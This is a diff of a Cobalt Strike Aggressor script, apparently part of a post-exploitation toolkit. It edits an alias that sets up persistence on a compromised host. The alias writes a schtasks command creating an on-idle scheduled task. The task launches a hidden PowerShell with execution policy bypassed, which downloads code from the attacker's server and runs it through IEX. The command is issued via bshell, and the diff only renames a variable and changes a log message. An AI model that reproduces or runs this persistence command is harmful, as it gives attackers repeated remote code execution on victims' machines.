@@ -47,14 +47,13 @@ alias addschtaskOnidle {
 
 	%site = getSiteURL();
 
-	$downloadip = %site['Host'];
+	$extip = %site['Host'];
 	$port = %site['Port'];
 	$uri = %site['URI'];
 
-	$schtask = "schtasks /create /tn $task /tr \"c:\\windows\\SYSWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://" . $downloadip . ": $+ $port $+ $uri $+ '''))'\" /sc onidle /i 30 /f";
+	$schtask = "schtasks /create /tn $task /tr \"c:\\windows\\SYSWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://" . $extip . ": $+ $port $+ $uri $+ '''))'\" /sc onidle /i 30 /f";
 	bshell($1,$schtask);
-	blog($1,"schtask dropped..");
-	bnote($1,"schtask dropped");
+	blog($1,"Schtask Onidle dropped..");
 }
 
 alias schtasksclean {
